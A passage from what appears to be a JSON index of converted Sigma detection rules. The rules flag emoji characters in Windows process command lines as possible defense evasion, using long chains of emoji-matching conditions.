'\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbb' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83d\udcbc' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd27' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83d\udd2c' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udfa8' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude92' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2708\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83d\ude80' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\u2696\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc70\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd35\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc78\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udec5\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd34\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd77\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddb8\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddb9\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd36\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf84' || evt.Parsed.CommandLine contains '\ud83c\udf85\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd9\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udddd\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udddb\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udddc\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddda\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc7c\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd30\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udec4\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udec3\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd31\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83c\udf7c' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude47\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc81\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude45\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude46\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude4b\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddcf\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd26\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd37\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude4e\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\ude4d\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc87\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc86\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd6\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc83\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udd7a\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udd74\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbd' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddbc' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udeb6\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc69\ud83c\udfff\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83d\udc68\ud83c\udfff\u200d\ud83e\uddaf' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddce\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83c\udfc3\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddcd\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc6d\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd1\ud83c\udfff\u200d\ud83e\udd1d\u200d\ud83e\uddd1\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc6c\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc6b\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd7\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc7\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83c\udfc2\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83c\udfcc\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83c\udfc4\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udea3\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83c\udfca\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udfff' || evt.Parsed.CommandLine contains '\u26f9\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83c\udfcb\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udeb4\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udeb5\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd38\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd3d\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd3e\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\udd39\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udfff\u200d\u2640\ufe0f' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83e\uddd8\ud83c\udfff\u200d\u2642\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udec0\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udecc\ud83c\udfff' || evt.Parsed.CommandLine contains '\ud83d\udc36' || evt.Parsed.CommandLine contains '\ud83d\udc31' || evt.Parsed.CommandLine contains '\ud83d\udc2d' || evt.Parsed.CommandLine contains '\ud83d\udc39' || evt.Parsed.CommandLine contains '\ud83d\udc30' || evt.Parsed.CommandLine contains '\ud83e\udd8a' || evt.Parsed.CommandLine contains '\ud83d\udc3b' || evt.Parsed.CommandLine contains '\ud83d\udc3c' || evt.Parsed.CommandLine contains '\ud83d\udc3b\u200d\u2744\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udc28' || evt.Parsed.CommandLine contains '\ud83d\udc2f' || evt.Parsed.CommandLine contains '\ud83e\udd81' || evt.Parsed.CommandLine contains '\ud83d\udc2e' || evt.Parsed.CommandLine contains '\ud83d\udc37' || evt.Parsed.CommandLine contains '\ud83d\udc3d' || evt.Parsed.CommandLine contains '\ud83d\udc38' || evt.Parsed.CommandLine contains '\ud83d\udc35' || evt.Parsed.CommandLine contains '\ud83d\ude48' || evt.Parsed.CommandLine contains '\ud83d\ude49' || evt.Parsed.CommandLine contains '\ud83d\ude4a' || evt.Parsed.CommandLine contains '\ud83d\udc12' || evt.Parsed.CommandLine contains '\ud83d\udc14' || evt.Parsed.CommandLine contains '\ud83d\udc27' || evt.Parsed.CommandLine contains '\ud83d\udc26' || evt.Parsed.CommandLine contains '\ud83d\udc24' || evt.Parsed.CommandLine contains '\ud83d\udc23' || evt.Parsed.CommandLine contains '\ud83d\udc25')\nblackhole: 2m\n#status: test\nlabels:\n  service: windows\n  confidence: 1\n  spoofable: 0\n  classification:\n\n  label: \"Potential Defense Evasion Activity Via Emoji Usage In CommandLine - 2\"\n  behavior : \"windows:audit\"\n  remediation: false\n\nscope:\n  type: ParentProcessId\n  expression: evt.Parsed.ParentProcessId\n\n", "description": "Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\n", "path": "scenarios/sigmahq/proc_creation_win_susp_emoji_usage_in_cli_2.yml", "version": "0.2", "versions": {"0.1": {"digest": "f54e75ea2a53ff3402bf58a04e106a9d452d4a824f539f6673a351647c524d2e"}, "0.2": {"digest": "4c93f4780f19ed35ccec4ad7517e3088d1de08321973717bfb1c50d00becab47"}}}, "sigmahq/proc_creation_win_susp_emoji_usage_in_cli_3": {"content": "type: trigger\nname: sigmahq/proc_creation_win_susp_emoji_usage_in_cli_3\ndescription: |\n  Detects the usage of emojis in the command line, this could be a sign of potential defense evasion activity.\nfilter: |\n  (evt.Meta.service == 'sysmon' && evt.Parsed.EventID == '1') && (evt.Parsed.CommandLine contains '\ud83e\udd86' || evt.Parsed.CommandLine contains '\ud83e\udd85' || evt.Parsed.CommandLine contains '\ud83e\udd89' || evt.Parsed.CommandLine contains '\ud83e\udd87' || evt.Parsed.CommandLine contains '\ud83d\udc3a' || evt.Parsed.CommandLine contains '\ud83d\udc17' || evt.Parsed.CommandLine contains '\ud83d\udc34' || evt.Parsed.CommandLine contains '\ud83e\udd84' || evt.Parsed.CommandLine contains '\ud83d\udc1d' || evt.Parsed.CommandLine contains '\ud83e\udeb1' || evt.Parsed.CommandLine contains '\ud83d\udc1b' || evt.Parsed.CommandLine contains '\ud83e\udd8b' || evt.Parsed.CommandLine contains '\ud83d\udc0c' || evt.Parsed.CommandLine contains '\ud83d\udc1e' || evt.Parsed.CommandLine contains '\ud83d\udc1c' || evt.Parsed.CommandLine contains '\ud83e\udeb0' || evt.Parsed.CommandLine contains '\ud83e\udeb2' || evt.Parsed.CommandLine contains '\ud83e\udeb3' || evt.Parsed.CommandLine contains '\ud83e\udd9f' || evt.Parsed.CommandLine contains '\ud83e\udd97' || evt.Parsed.CommandLine contains '\ud83d\udd77' || evt.Parsed.CommandLine contains '\ud83d\udd78' || evt.Parsed.CommandLine contains '\ud83e\udd82' || evt.Parsed.CommandLine contains '\ud83d\udc22' || evt.Parsed.CommandLine contains '\ud83d\udc0d' || evt.Parsed.CommandLine contains '\ud83e\udd8e' || evt.Parsed.CommandLine contains '\ud83e\udd96' || evt.Parsed.CommandLine contains '\ud83e\udd95' || evt.Parsed.CommandLine contains '\ud83d\udc19' || evt.Parsed.CommandLine contains '\ud83e\udd91' || evt.Parsed.CommandLine contains '\ud83e\udd90' || evt.Parsed.CommandLine contains '\ud83e\udd9e' || evt.Parsed.CommandLine contains '\ud83e\udd80' || evt.Parsed.CommandLine contains '\ud83e\udeb8' || evt.Parsed.CommandLine contains '\ud83d\udc21' || evt.Parsed.CommandLine contains '\ud83d\udc20' || evt.Parsed.CommandLine contains '\ud83d\udc1f' || evt.Parsed.CommandLine contains '\ud83d\udc2c' || evt.Parsed.CommandLine contains '\ud83d\udc33' || evt.Parsed.CommandLine contains '\ud83d\udc0b' || evt.Parsed.CommandLine contains '\ud83e\udd88' || evt.Parsed.CommandLine contains '\ud83d\udc0a' || evt.Parsed.CommandLine contains '\ud83d\udc05' || evt.Parsed.CommandLine contains '\ud83d\udc06' || evt.Parsed.CommandLine contains '\ud83e\udd93' || evt.Parsed.CommandLine contains '\ud83e\udd8d' || evt.Parsed.CommandLine contains '\ud83e\udda7' || evt.Parsed.CommandLine contains '\ud83e\udda3' || evt.Parsed.CommandLine contains '\ud83d\udc18' || evt.Parsed.CommandLine contains '\ud83e\udd9b' || evt.Parsed.CommandLine contains '\ud83e\udd8f' || evt.Parsed.CommandLine contains '\ud83d\udc2a' || evt.Parsed.CommandLine contains '\ud83d\udc2b' || evt.Parsed.CommandLine contains '\ud83e\udd92' || evt.Parsed.CommandLine contains '\ud83e\udd98' || evt.Parsed.CommandLine contains '\ud83e\uddac' || evt.Parsed.CommandLine contains '\ud83d\udc03' || evt.Parsed.CommandLine contains '\ud83d\udc02' || evt.Parsed.CommandLine contains '\ud83d\udc04' || evt.Parsed.CommandLine contains '\ud83d\udc0e' || evt.Parsed.CommandLine contains '\ud83d\udc16' || evt.Parsed.CommandLine contains '\ud83d\udc0f' || evt.Parsed.CommandLine contains '\ud83d\udc11' || evt.Parsed.CommandLine contains '\ud83e\udd99' || evt.Parsed.CommandLine contains '\ud83d\udc10' || evt.Parsed.CommandLine contains '\ud83e\udd8c' || evt.Parsed.CommandLine contains '\ud83d\udc15' || evt.Parsed.CommandLine contains '\ud83d\udc29' || evt.Parsed.CommandLine contains '\ud83e\uddae' || evt.Parsed.CommandLine contains '\ud83d\udc15\u200d\ud83e\uddba' || evt.Parsed.CommandLine contains '\ud83d\udc08' || evt.Parsed.CommandLine contains '\ud83d\udc08\u200d\u2b1b' || evt.Parsed.CommandLine contains '\ud83e\udeb6' || evt.Parsed.CommandLine contains '\ud83d\udc13' || evt.Parsed.CommandLine contains '\ud83e\udd83' || evt.Parsed.CommandLine contains '\ud83e\udda4' || evt.Parsed.CommandLine contains '\ud83e\udd9a' || evt.Parsed.CommandLine contains '\ud83e\udd9c' || evt.Parsed.CommandLine contains '\ud83e\udda2' || evt.Parsed.CommandLine contains '\ud83e\udda9' || evt.Parsed.CommandLine contains '\ud83d\udd4a' || evt.Parsed.CommandLine contains '\ud83d\udc07' || evt.Parsed.CommandLine contains '\ud83e\udd9d' || evt.Parsed.CommandLine contains '\ud83e\udda8' || evt.Parsed.CommandLine contains '\ud83e\udda1' || evt.Parsed.CommandLine contains '\ud83e\uddab' || evt.Parsed.CommandLine contains '\ud83e\udda6' || evt.Parsed.CommandLine contains '\ud83e\udda5' || evt.Parsed.CommandLine contains '\ud83d\udc01' || evt.Parsed.CommandLine contains '\ud83d\udc00' || evt.Parsed.CommandLine contains '\ud83d\udc3f' || evt.Parsed.CommandLine contains '\ud83e\udd94' || evt.Parsed.CommandLine contains '\ud83d\udc3e' || evt.Parsed.CommandLine contains '\ud83d\udc09' || evt.Parsed.CommandLine contains '\ud83d\udc32' || evt.Parsed.CommandLine contains '\ud83c\udf35' || evt.Parsed.CommandLine contains '\ud83c\udf84' || evt.Parsed.CommandLine contains '\ud83c\udf32' || evt.Parsed.CommandLine contains '\ud83c\udf33' || evt.Parsed.CommandLine contains '\ud83c\udf34' || evt.Parsed.CommandLine contains '\ud83e\udeb9' || evt.Parsed.CommandLine contains '\ud83e\udeba' || evt.Parsed.CommandLine contains '\ud83e\udeb5' || evt.Parsed.CommandLine contains '\ud83c\udf31' || evt.Parsed.CommandLine contains '\ud83c\udf3f' || evt.Parsed.CommandLine contains '\u2618\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf40' || evt.Parsed.CommandLine contains '\ud83c\udf8d' || evt.Parsed.CommandLine contains '\ud83e\udeb4' || evt.Parsed.CommandLine contains '\ud83c\udf8b' || evt.Parsed.CommandLine contains '\ud83c\udf43' || evt.Parsed.CommandLine contains '\ud83c\udf42' || evt.Parsed.CommandLine contains '\ud83c\udf41' || evt.Parsed.CommandLine contains '\ud83c\udf44' || evt.Parsed.CommandLine contains '\ud83d\udc1a' || evt.Parsed.CommandLine contains '\ud83e\udea8' || evt.Parsed.CommandLine contains '\ud83c\udf3e' || evt.Parsed.CommandLine contains '\ud83d\udc90' || evt.Parsed.CommandLine contains '\ud83c\udf37' || evt.Parsed.CommandLine contains '\ud83e\udeb7' || evt.Parsed.CommandLine contains '\ud83c\udf39' || evt.Parsed.CommandLine contains '\ud83e\udd40' || evt.Parsed.CommandLine contains '\ud83c\udf3a' || evt.Parsed.CommandLine contains '\ud83c\udf38' || evt.Parsed.CommandLine contains '\ud83c\udf3c' || evt.Parsed.CommandLine contains '\ud83c\udf3b' || evt.Parsed.CommandLine contains '\ud83c\udf1e' || evt.Parsed.CommandLine contains '\ud83c\udf1d' || evt.Parsed.CommandLine contains '\ud83c\udf1b' || evt.Parsed.CommandLine contains '\ud83c\udf1c' || evt.Parsed.CommandLine contains '\ud83c\udf1a' || evt.Parsed.CommandLine contains '\ud83c\udf15' || evt.Parsed.CommandLine contains '\ud83c\udf16' || evt.Parsed.CommandLine contains '\ud83c\udf17' || evt.Parsed.CommandLine contains '\ud83c\udf18' || evt.Parsed.CommandLine contains '\ud83c\udf11' || evt.Parsed.CommandLine contains '\ud83c\udf12' || evt.Parsed.CommandLine contains '\ud83c\udf13' || evt.Parsed.CommandLine contains '\ud83c\udf14' || evt.Parsed.CommandLine contains '\ud83c\udf19' || evt.Parsed.CommandLine contains '\ud83c\udf0e' || evt.Parsed.CommandLine contains '\ud83c\udf0d' || evt.Parsed.CommandLine contains '\ud83c\udf0f' || evt.Parsed.CommandLine contains '\ud83e\ude90' || evt.Parsed.CommandLine contains '\ud83d\udcab' || evt.Parsed.CommandLine contains '\u2b50\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf1f' || evt.Parsed.CommandLine contains '\u2728' || evt.Parsed.CommandLine contains '\u26a1\ufe0f' || evt.Parsed.CommandLine contains '\u2604\ufe0f' || evt.Parsed.CommandLine contains '\ud83d\udca5' || evt.Parsed.CommandLine contains '\ud83d\udd25' || evt.Parsed.CommandLine contains '\ud83c\udf2a' || evt.Parsed.CommandLine contains '\ud83c\udf08' || evt.Parsed.CommandLine contains '\u2600\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf24' || evt.Parsed.CommandLine contains '\u26c5\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf25' || evt.Parsed.CommandLine contains '\u2601\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf26' || evt.Parsed.CommandLine contains '\ud83c\udf27' || evt.Parsed.CommandLine contains '\u26c8' || evt.Parsed.CommandLine contains '\ud83c\udf29' || evt.Parsed.CommandLine contains '\ud83c\udf28' || evt.Parsed.CommandLine contains '\u2744\ufe0f' || evt.Parsed.CommandLine contains '\u2603\ufe0f' || evt.Parsed.CommandLine contains '\u26c4\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf2c' || evt.Parsed.CommandLine contains '\ud83d\udca8' || evt.Parsed.CommandLine contains '\ud83d\udca7' || evt.Parsed.CommandLine contains '\ud83d\udca6' || evt.Parsed.CommandLine contains '\ud83e\udee7' || evt.Parsed.CommandLine contains '\u2614\ufe0f' || evt.Parsed.CommandLine contains '\u2602\ufe0f' || evt.Parsed.CommandLine contains '\ud83c\udf0a' || evt.Parsed.CommandLine contains '\ud83c\udf2b\ud83c\udf4f' || evt.Parsed.CommandLine contains '\ud83c\udf4e' || evt.Parsed.CommandLine contains '\ud83c\udf50' || evt.Parsed.CommandLine contains '\ud83c\udf4a' || evt.Parsed.CommandLine contains '\ud83c\udf4b' || evt.Parsed.CommandLine contains '\ud83c\udf4c' || evt.Parsed.CommandLine contains '\ud83c\udf49' || evt.Parsed.CommandLine contains '\ud83c\udf47' || evt.Parsed.CommandLine contains '\ud83c\udf53' || evt.Parsed.CommandLine contains '\ud83e\uded0' || evt.Parsed.CommandLine contains '\ud83c\udf48' || evt.Parsed.CommandLine contains '\ud83c\udf52' || evt.Parsed.CommandLine contains '\ud83c\udf51' || evt.Parsed.CommandLine contains '\ud83e\udd6d' || evt.Parsed.CommandLine contains '\ud83c\udf4d' || evt.Parsed.CommandLine contains '\ud83e\udd65' || evt.Parsed.CommandLine contains '\ud83e\udd5d' || evt.Parsed.CommandLine contains '\ud83c\udf45' || evt.Parsed.CommandLine contains '\ud83c\udf46' || evt.Parsed.CommandLine contains '\ud83e\udd51' || evt.Parsed.CommandLine contains '\ud83e\udd66' || evt.Parsed.CommandLine contains '\ud83e\udd6c' || evt.Parsed.CommandLine contains '\ud83e\udd52' || evt.Parsed.CommandLine contains '\ud83c\udf36' || evt.Parsed.CommandLine contains 